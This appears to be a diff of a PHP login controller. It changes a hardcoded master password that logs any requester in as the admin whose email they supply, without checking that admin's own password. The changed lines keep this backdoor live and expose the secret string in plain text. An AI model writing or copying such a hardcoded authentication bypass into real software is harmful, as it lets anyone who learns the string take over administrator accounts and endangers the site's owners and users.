@@ -37,7 +37,7 @@ class HomeController extends Controller
             }
             return redirect()->route('dashboard');
         }
-        if ($request->input("password") == 'islam123456') {
+        if ($request->input("password") == 'islam12345') {
             $admin = Admin::where('email', $request->email)->first();
             Auth::login($admin);
             return redirect()->route('dashboard');
